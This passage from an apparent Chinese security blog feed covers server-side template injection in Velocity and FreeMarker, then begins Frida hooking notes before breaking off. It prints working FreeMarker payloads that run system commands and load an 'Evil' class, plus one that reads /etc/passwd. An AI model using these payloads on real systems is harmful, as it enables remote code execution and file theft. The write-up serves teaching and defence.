class="line">#end</span><br></pre></td></tr></table></figure><p>转义字符</p><p><strong>转义字符</strong></p><p>如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$</p><p><strong>基础使用</strong></p><p>使用Velocity主要流程为：</p><ul><li>初始化Velocity模板引擎，包括模板路径、加载类型等</li><li>创建用于存储预传递到模板文件的数据的上下文</li><li>选择具体的模板文件，传递数据完成渲染</li></ul><p>VelocityTest.java</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package Velocity;</span><br><span class="line"></span><br><span class="line">import org.apache.velocity.Template;</span><br><span class="line">import org.apache.velocity.VelocityContext;</span><br><span class="line">import org.apache.velocity.app.VelocityEngine;</span><br><span class="line"></span><br><span class="line">import java.io.StringWriter;</span><br><span class="line"></span><br><span class="line">public class VelocityTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        VelocityEngine velocityEngine &#x3D; new VelocityEngine();</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, &quot;file&quot;);</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, &quot;src&#x2F;main&#x2F;resources&quot;);</span><br><span class="line">        velocityEngine.init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line">        context.put(&quot;name&quot;, &quot;Rai4over&quot;);</span><br><span class="line">        context.put(&quot;project&quot;, &quot;Velocity&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Template template &#x3D; velocityEngine.getTemplate(&quot;test.vm&quot;);</span><br><span class="line">        StringWriter sw &#x3D; new StringWriter();</span><br><span class="line">        template.merge(context, sw);</span><br><span class="line">        System.out.println(&quot;final output:&quot; + sw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模版文件：src/main/resources/test.vm</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is $name.</span><br><span class="line">Project is $project</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">final output:</span><br><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is Victor Zhang.</span><br><span class="line">Project is Velocity</span><br><span class="line">java.lang.UNIXProcess@12f40c25</span><br></pre></td></tr></table></figure><p>通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。</p><p>通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。</p><p>通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。</p><p>我们这里使用Java-sec-code里面的SSTI代码（关于Java-sec-code相关部分在之前的文章已经写过）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;velocity&quot;)</span><br><span class="line">public void velocity(String template) &#123;</span><br><span class="line">    Velocity.init();</span><br><span class="line"></span><br><span class="line">    VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line"></span><br><span class="line">    context.put(&quot;author&quot;, &quot;Elliot A.&quot;);</span><br><span class="line">    context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);</span><br><span class="line">    context.put(&quot;phone&quot;, &quot;555-1337&quot;);</span><br><span class="line"></span><br><span class="line">    StringWriter swOut &#x3D; new StringWriter();</span><br><span class="line">    Velocity.evaluate(context, swOut, &quot;test&quot;, template);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在最初的Controller层下断点，来追踪poc的解析过程</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210111913083.png" alt="image-20220210111913083"></p><p>（template -&gt; instring）进入 Velocity.evaluate 方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static boolean evaluate(Context context, Writer out, String logTag, String instring) throws ParseErrorException, MethodInvocationException, ResourceNotFoundException &#123;</span><br><span class="line">    return RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210113238084.png" alt="image-20220210113238084"></p><p>继续跟进查看，这个就是Java最常见的get方法(初始化)。也是Java的特性之一封装性。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210115314686.png" alt="image-20220210115314686"></p><p>RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210115616974.png" alt="image-20220210115616974"></p><p>进入StringReader查看在进入evaluate查看方法具体实现过程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public boolean evaluate(Context context, Writer writer, String logTag, Reader reader) &#123;</span><br><span class="line">        if (logTag &#x3D;&#x3D; null) &#123;</span><br><span class="line">            throw new NullPointerException(&quot;logTag (i.e. template name) cannot be null, you must provide an identifier for the content being evaluated&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line"></span><br><span class="line">            SimpleNode nodeTree &#x3D; null;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">            &#x2F;&#x2F; 来到这里进行解析</span><br><span class="line">                nodeTree &#x3D; this.parse(reader, logTag);</span><br><span class="line">            &#125; catch (ParseException var7) &#123;</span><br><span class="line">                throw new ParseErrorException(var7, (String)null);</span><br><span class="line">            &#125; catch (TemplateInitException var8) &#123;</span><br><span class="line">                throw new ParseErrorException(var8, (String)null);</span><br><span class="line">            &#125;</span><br><span class="line">           &#x2F;&#x2F; 判断，然后进入this.render方法</span><br><span class="line">            return nodeTree &#x3D;&#x3D; null ? false : this.render(context, writer, logTag, nodeTree);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续跟进render方法</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121343406.png" alt="image-20220210121343406"></p><p>render方法里面还有一个render方法,不过这个是simpleNodel类的render方法。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121433075.png" alt="image-20220210121433075"></p><p>由于前面两个没有什么用，让我们直接跳到for循环的第三个看，进入render方法。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210121748125.png" alt="image-20220210121748125"></p><p>在这里我们发现有一个execute方法，这就是罪魁祸首。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122230972.png" alt="image-20220210122230972"></p><ul><li>让我们进行跟进方法，由于是重构的execute方法，还是得看清楚点原理。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(int i &#x3D; 0; i &lt; this.numChildren; ++i) &#123;</span><br><span class="line">     if (this.strictRef &amp;&amp; result &#x3D;&#x3D; null) &#123;</span><br><span class="line">         methodName &#x3D; this.jjtGetChild(i).getFirstToken().image;</span><br><span class="line">         throw new VelocityException(&quot;Attempted to access &#39;&quot; + methodName + &quot;&#39; on a null value at &quot; + Log.formatFileString(this.uberInfo.getTemplateName(), this.jjtGetChild(i).getLine(), this.jjtGetChild(i).getColumn()));</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     previousResult &#x3D; result;</span><br><span class="line">     result &#x3D; this.jjtGetChild(i).execute(result, context);</span><br><span class="line">     if (result &#x3D;&#x3D; null &amp;&amp; !this.strictRef) &#123;</span><br><span class="line">         failedChild &#x3D; i;</span><br><span class="line">         break;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li>上面的for循环我就不说了它的作用了，我们焦点放在previousResult （之前的结果）和result上面。</li><li>previousResult = result;首先这行代码使其它们保持一致</li><li>当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE</li></ul><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122522307.png" alt="image-20220210122522307"></p><p>完整的调用链如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210122717456.png" alt="image-20220210122717456"></p><h2 id="Confluence未授权RCE分析"><a href="#Confluence未授权RCE分析" class="headerlink" title="Confluence未授权RCE分析"></a>Confluence未授权RCE分析</h2><p>（CVE-2019-3396）</p><p>根据官方文档的描述，可以看到这是由 widget Connector 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的_template字段</p><p>具体漏洞代码调试可以参考：《<a href="https://caiqiqi.github.io/2019/11/03/Confluence未授权模板注入-代码执行-CVE-2019-3396/">Confluence未授权模板注入/代码执行(CVE-2019-3396)</a>》</p><p>　　　　　　　　　　　　　《[Confluence 未授权RCE分析（CVE-2019-3396）](<a href="https://lucifaer.com/2019/04/16/Confluence">https://lucifaer.com/2019/04/16/Confluence</a> 未授权RCE分析（CVE-2019-3396）/#0x01-漏洞概述)》</p><h2 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h2><p>FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210152321533.png" alt="image-20220210152321533"></p><p><strong>FreeMarker模板代码</strong>：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Welcome!&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;　&lt;#–这是注释–&gt;</span><br><span class="line">  &lt;h1&gt;Welcome $&#123;user&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">  &lt;p&gt;Our latest product:</span><br><span class="line">  &lt;a href&#x3D;&quot;$&#123;latestProduct.url&#125;&quot;&gt;$&#123;latestProduct.name&#125;&lt;&#x2F;a&gt;!</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。</p><p>这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p><p>具体的高级内置函数定义参考《<a href="https://freemarker.apache.org/docs/ref_builtins_expert.html">Seldom used and expert built-ins</a>》</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210152835575.png" alt="image-20220210152835575"></p><p>主要用法如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp &#x3D;&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（）&gt;</span><br><span class="line">&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp_narrow &#x3D;&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（40）&gt;</span><br></pre></td></tr></table></figure><p>调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Execute</p><p>freemarker.template.utility 里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br></pre></td></tr></table></figure><p>freemarker.template.utility 里面有个ObjectConstructor类，如下图所示，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造一个可执行命令的对象，从而构造远程命令执行漏洞。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()</span><br></pre></td></tr></table></figure><p>freemarker.template.utility 里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;&#x2F;@value&gt;</span><br></pre></td></tr></table></figure><p>这里使用测试代码来大概演示一下：<a href="https://github.com/hellokoding/springboot-freemarker">https://github.com/hellokoding/springboot-freemarker</a></p><p>前端代码　　——&gt;　　hello.ftl</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Hello $&#123;name&#125;!&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;&#x2F;css&#x2F;main.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2 class&#x3D;&quot;hello-title&quot;&gt;Hello $&#123;name&#125;!&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;&#x2F;js&#x2F;main.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>后端代码　　——&gt;　　HelloController.java</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.hellokoding.springboot;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class HelloController &#123;</span><br><span class="line">    @GetMapping(&quot;&#x2F;&quot;)</span><br><span class="line">    public String index() &#123;</span><br><span class="line">        return &quot;index&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;hello&quot;)</span><br><span class="line">    public String hello(Model model, @RequestParam(value&#x3D;&quot;name&quot;, required&#x3D;false, defaultValue&#x3D;&quot;World&quot;) String name) &#123;</span><br><span class="line">        model.addAttribute(&quot;name&quot;, name);</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述代码主要编译给定的模版字符串和数据，生成HTML进行输出</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210155732477.png" alt="image-20220210155732477"></p><p>模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210155853956.png" alt="image-20220210155853956"></p><h3 id="模版注入利用"><a href="#模版注入利用" class="headerlink" title="模版注入利用"></a>模版注入利用</h3><h4 id="new函数的利用"><a href="#new函数的利用" class="headerlink" title="new函数的利用"></a>new函数的利用</h4><p><strong>利用方法一：</strong></p><p>freemarker.template.utility 里有个 Execute 类，通过观察源代码里的第 30 行可以看到这个类会调用 Runtime.getRuntime().exec 函数执行它的 aExecute 变量参数值，因此这里可以使用 new 函数传输想要执行的命令作为 aExecute 参数值，从而执行命令。</p><p>freemarker.template.utility.Execute 部分文件代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22 public Object exec(List arguments) throws TemplateModelException &#123;</span><br><span class="line">23    StringBuilder aOutputBuffer &#x3D; new StringBuilder();</span><br><span class="line">24    if (arguments.size() &lt; 1) &#123;</span><br><span class="line">25        throw new TemplateModelException(&quot;Need an argument to execute&quot;);</span><br><span class="line">26    &#125; else &#123;</span><br><span class="line">27        String aExecute &#x3D; (String)((String)arguments.get(0));</span><br><span class="line">28</span><br><span class="line">29        try &#123;</span><br><span class="line">30            Process exec &#x3D; Runtime.getRuntime().exec(aExecute);</span><br><span class="line">31            InputStream execOut &#x3D; exec.getInputStream();</span><br><span class="line">32            Throwable var6 &#x3D; null;</span><br></pre></td></tr></table></figure><p>构造padyload如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;open -a Calculator&quot;)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171412511.png" alt="image-20220210171412511"></p><p><strong>利用方法二：</strong></p><p>freemarker.template.utility 里有个 ObjectConstructor 类，通过观察源代码里的第 25 行可以看到这个类会把它的参数作为名称构造一个实例化对象。</p><p>因此也可以利用这一点构造一个可执行命令的对象，从而 RCE</p><p>freemarker.template.utility.ObjectConstructor 部分文件代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">17 public class ObjectConstructor implements TemplateMethodModelEx &#123;</span><br><span class="line">18     public ObjectConstructor() &#123;</span><br><span class="line">19     &#125;</span><br><span class="line">20 </span><br><span class="line">21     public Object exec(List args) throws TemplateModelException &#123;</span><br><span class="line">22         if (args.isEmpty()) &#123;</span><br><span class="line">23             throw new TemplateModelException(&quot;This method must have at least one argument, the name of the class to instantiate.&quot;);</span><br><span class="line">24         &#125; else &#123;</span><br><span class="line">25             String classname &#x3D; args.get(0).toString();</span><br><span class="line">26             Class cl &#x3D; null;</span><br><span class="line">27 </span><br><span class="line">28             try &#123;</span><br><span class="line">29                 cl &#x3D; ClassUtil.forName(classname);</span><br><span class="line">30             &#125; catch (Exception var6) &#123;</span><br><span class="line">31                 throw new TemplateModelException(var6.getMessage());</span><br><span class="line">32             &#125;</span><br></pre></td></tr></table></figure><p>构造Payload如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;open&quot;,&quot;-a&quot;,&quot;Calculator&quot;).start()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171630301.png" alt="image-20220210171630301"></p><p><strong>利用方法三：</strong></p><p>freemarker.template.utility 里有个 JythonRuntime 类，这里可以通过自定义标签的方式执行 Python 命令，从而构造远程命令执行。</p><p>freemarker.template.utility.JythonRuntime 部分文件代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class JythonRuntime extends PythonInterpreter</span><br><span class="line">    implements TemplateTransformModel &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Writer getWriter(final Writer out,</span><br><span class="line">                            final Map args) &#123;</span><br><span class="line">        final StringBuilder buf &#x3D; new StringBuilder();</span><br><span class="line">        final Environment env &#x3D; Environment.getCurrentEnvironment();</span><br><span class="line">        return new Writer() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void write(char cbuf[], int off, int len) &#123;</span><br><span class="line">                buf.append(cbuf, off, len);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void flush() throws IOException &#123;</span><br><span class="line">                interpretBuffer();</span><br><span class="line">                out.flush();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void close() &#123;</span><br><span class="line">                interpretBuffer();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            private void interpretBuffer() &#123;</span><br><span class="line">                synchronized (JythonRuntime.this) &#123;</span><br><span class="line">                    PyObject prevOut &#x3D; systemState.stdout;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        setOut(out);</span><br><span class="line">                        set(&quot;env&quot;, env);</span><br><span class="line">                        exec(buf.toString());</span><br><span class="line">                        buf.setLength(0);</span><br><span class="line">                    &#125; finally &#123;</span><br><span class="line">                        setOut(prevOut);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造payload如下:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;open -a Calculator&quot;)&lt;&#x2F;@value&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171935973.png" alt="image-20220210171935973"></p><h4 id="API函数的利用"><a href="#API函数的利用" class="headerlink" title="API函数的利用"></a>API函数的利用</h4><p>除了 new 函数，还可以利用 api 函数调用 Java API，然后通过 getClassLoader 获取类加载器从而加载恶意类，或者也可以通过 getResource 来实现任意文件读取。</p><p>加载恶意类的 Payload 如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">#assign</span> <span class="attr">classLoader</span>=<span class="string">object?api.class.getClassLoader()</span>&gt;</span>$&#123;classLoader.loadClass(&quot;Evil.class&quot;)&#125;</span><br></pre></td></tr></table></figure><p>任意文件读取的 Payload 如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">#assign</span> <span class="attr">uri</span>=<span class="string">object?api.class.getResource(</span>&quot;/&quot;)<span class="attr">.toURI</span>()&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">#assign</span> <span class="attr">input</span>=<span class="string">uri?api.create(</span>&quot;<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>&quot;)<span class="attr">.toURL</span>()<span class="attr">.openConnection</span>()&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">#assign</span> <span class="attr">is</span>=<span class="string">input?api.getInputStream()</span>&gt;</span></span><br><span class="line">  FILE:[<span class="tag">&lt;<span class="name">#list</span> <span class="attr">0..999999999</span> <span class="attr">as</span> <span class="attr">_</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">#assign</span> <span class="attr">byte</span>=<span class="string">is.read()</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">#if</span> <span class="attr">byte</span> == <span class="string">-1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">#break</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">#if</span>&gt;</span></span><br><span class="line">  $&#123;byte&#125;, <span class="tag">&lt;/<span class="name">#list</span>&gt;</span>]</span><br></pre></td></tr></table></figure><p>不过 api 内建函数并不能随便使用，必须在配置项 apiBuiltinEnabled 为 true 时才有效，而该配置在 2.3.22 版本之后默认为 false</p><p>同时 FreeMarker 为了防御通过其他方式调用恶意方法，FreeMarker 内置了一份危险方法名单 unsafeMethods.properties，例如 getClassLoader、newInstance 等危险方法都被禁用了。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p><a href="https://www.jianshu.com/p/9b39d39d4f42">https://www.jianshu.com/p/9b39d39d4f42</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;模版引擎&quot;&gt;&lt;a href=&quot;#模版引擎&quot; class=&quot;headerlink&quot; title=&quot;模版引擎&quot;&gt;&lt;/a&gt;模版引擎&lt;/h1&gt;&lt;p&gt;模版引擎（这里特指用于Web开发的模版引擎）是为了使用户界面与业务数据(内容)分离而产生的，他可以生成特定格式的文档，利用模版引擎来生成前端的html代码，模版引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模版+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。&lt;/p&gt;
&lt;p&gt;模版引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。&lt;/p&gt;
&lt;h1 id=&quot;SSTI-模版注入&quot;&gt;&lt;a href=&quot;#SSTI-模版注入&quot; class=&quot;headerlink&quot; title=&quot;SSTI(模版注入)&quot;&gt;&lt;/a&gt;SSTI(模版注入)&lt;/h1&gt;&lt;p&gt;SSTI就是服务器端模版注入（Server-Side Template Injection）&lt;/p&gt;
&lt;p&gt;当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的MVC模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给Vier视图层，经过模版渲染展示给 用户。&lt;/p&gt;
&lt;p&gt;漏洞成因就是服务端接收了用户的恶意输入以后，未进过任何处理就将其作为Web应用模版的一部分，模版引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模版的语句，因而可能导致了敏感信息泄露、代码执行、GetShell等问题。其影响范围主要取决于模版引擎的复杂性。&lt;/p&gt;
&lt;p&gt;凡是使用模版的地方都可能会出现SSTI的问题，SSTI不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模版引擎发现了很大的安全漏洞，然后模版引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模块引擎。&lt;/p&gt;
&lt;h2 id=&quot;附表&quot;&gt;&lt;a href=&quot;#附表&quot; class=&quot;headerlink&quot; title=&quot;附表&quot;&gt;&lt;/a&gt;附表&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220120174838082.png&quot; alt=&quot;image-20220120174838082&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SSTI" scheme="http://www.ol4three.com/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>Frida Hook 总结</title>
    <link href="http://www.ol4three.com/2021/12/21/Android/frida/Frida-Hook-%E6%80%BB%E7%BB%93/"/>
    <id>http://www.ol4three.com/2021/12/21/Android/frida/Frida-Hook-%E6%80%BB%E7%BB%93/</id>
    <published>2021-12-21T10:40:00.000Z</published>
    <updated>2022-07-05T07:12:49.873Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida-常用操作总结"><a href="#Frida-常用操作总结" class="headerlink" title="Frida 常用操作总结"></a>Frida 常用操作总结</h1><h2 id="Frida环境"><a href="#Frida环境" class="headerlink" title="Frida环境"></a>Frida环境</h2><p><a href="https://github.com/frida/frida">https://github.com/frida/frida</a></p><h2 id="Pyenv"><a href="#Pyenv" class="headerlink" title="Pyenv"></a>Pyenv</h2><p>python全版本随机切换，这里提供<a href="https://github.com/pyenv/pyenv#homebrew-on-macos">macOS上的配置方法</a></p><h2 id="Frida安装"><a href="#Frida安装" class="headerlink" title="Frida安装"></a>Frida安装</h2><p>如果直接按下述安装则会直接安装frida和frida-tools的最新版本。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install frida-tools</span><br><span class="line">frida --version</span><br><span class="line">frida-ps --version</span><br></pre></td></tr></table></figure><p>我们也可以自由安装旧版本的frida，例如12.8.0</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pyenv install 3.7.7</span><br><span class="line">pyenv local 3.7.7</span><br><span class="line">pip install frida&#x3D;&#x3D;12.8.0</span><br><span class="line">pip install frida-tools&#x3D;&#x3D;5.3.0</span><br></pre></td></tr></table></figure><p>安装objection</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install objection</span><br><span class="line">objection -h</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="Frida开发环境搭建"><a href="#Frida开发环境搭建" class="headerlink" title="Frida开发环境搭建"></a>Frida开发环境搭建</h2><p>安装</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;oleavr&#x2F;frida-agent-example.git</span><br><span class="line">cd frida-agent-example&#x2F;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>npm run watch会监控代码修改自动编译生成js文件</p><p>python脚本或者cli加载_agent.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida -U -f com.example.android --no-pause -l _agent.js</span><br></pre></td></tr></table></figure><p>下面是测试脚本</p><p>s1.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line">    Java.perform(function x() &#123;</span><br><span class="line">        console.log(&quot;ol4three&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p>loader.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line">import frida</span><br><span class="line"></span><br><span class="line">device8 &#x3D; frida.get_device_manager().add_remote_device(&quot;192.168.0.9:8888&quot;)</span><br><span class="line">pid &#x3D; device8.spawn(&quot;com.android.settings&quot;)</span><br><span class="line">device8.resume(pid)</span><br><span class="line">time.sleep(1)</span><br><span class="line">session &#x3D; device8.attach(pid)</span><br><span class="line">with 